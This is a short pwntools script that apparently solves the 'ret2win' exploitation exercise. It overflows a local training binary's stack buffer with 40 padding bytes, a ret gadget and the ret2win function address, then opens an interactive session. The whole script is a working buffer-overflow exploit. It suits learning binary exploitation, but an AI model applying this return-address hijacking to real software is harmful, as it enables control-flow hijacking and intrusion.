`script.py`: 

```python
from pwn import * 

p = process('./ret2win')
ret_gadget = p64(0x000000000040053e)
ret2win = p64(0x400756)
payload = b'A'*40 + ret_gadget + ret2win
p.sendline(payload)
p.interactive()
```




